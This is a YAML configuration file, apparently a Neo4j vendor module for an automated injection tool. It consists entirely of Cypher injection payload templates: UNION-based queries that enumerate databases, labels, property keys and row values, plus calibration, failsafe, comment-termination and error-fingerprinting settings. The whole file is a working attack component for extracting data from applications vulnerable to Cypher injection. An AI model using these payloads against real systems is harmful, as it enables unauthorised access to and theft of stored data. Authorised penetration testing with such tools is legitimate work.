vendor: Neo4j

resource:
 info: |
  '' AS A LIMIT 0 UNION
  MATCH (n)
  RETURN DISTINCT
      '${lead}'
      %2b '-'
      %2b '${enclose_value_sql}'
      %2b '-'
      %2b '${enclose_value_sql}'
      %2b '-'
      %2b '${trail_sql}'

 schema:
  database: |
   '' AS A LIMIT 0 UNION
   MATCH (n)
   RETURN DISTINCT
       '${lead}${enclose_value_sql}neo4j${separator_qte_sql}0${enclose_value_sql}${trail_sql}'
       AS A
   ${limit}
   UNION MATCH (n:blah) RETURN n

  table: |
   '' AS A LIMIT 0 UNION
   CALL db.labels()
   YIELD label
   WITH label
   ${limit}
   RETURN
       '${lead}'
       %2b reduce(
           b = '',
           n IN collect(label) |
               b
               %2b '${enclose_value_sql}'
               %2b n
               %2b '${separator_qte_sql}0${enclose_value_sql}'
       )
       %2b '${trail_sql}'
       AS A
   UNION MATCH (n:blah) RETURN n

  column: |
   '' AS A LIMIT 0 UNION
   MATCH (n:${table})
   WITH collect(keys(n)) AS attr
   UNWIND attr AS r
   WITH DISTINCT r[0] AS d
   ORDER BY d
   ${limit}
   RETURN
       '${lead}'
       %2b reduce(
           b = '',
           n IN collect(d) |
           b
           %2b '${enclose_value_sql}'
           %2b n
           %2b '${separator_qte_sql}0${enclose_value_sql}'
       )
   %2b '${trail_sql}'
   AS A
   UNION MATCH (n:blah) RETURN n

  row:
   query: |
    '' AS A LIMIT 0 UNION
    MATCH (n:${table})
    WITH DISTINCT n
    ${limit}
    RETURN
        '${lead}'
        %2b reduce(
            b = "",
            n IN collect(n) |
            b
            %2b '${enclose_value_sql}'
            %2b ${fields}
            %2b '${separator_qte_sql}0${enclose_value_sql}${separator_cell_sql}'
        )
    %2b '${trail_sql}'
    AS A
    UNION MATCH (n:blah) RETURN n
   fields:
    field: coalesce(n.${field.value}, '')
    concat: "%2b '%7f' %2b"

strategy:
 configuration:
  slidingWindow: ${injection}
  limit: skip ${limit.value} LIMIT 65536
  failsafe: MATCH (n) RETURN 1337${indice}7330%2b1 AS A
  calibrator: |
   '' AS A LIMIT 0 UNION
   MATCH (n)
   RETURN
       '${lead}${indice}'
       %2b reduce(
           a = "",
           nn IN collect(n) |
           a %2b "${calibrator_sql}"
       )
  limitBoundary: 0
  endingComment: //
  fingerprint:
   errorMessage:
    - neo4j

 normal:
  indices: RETURN 'A' AS A UNION ${indices}
  capacity: ${calibrator}
  orderBy: ORDER BY 1337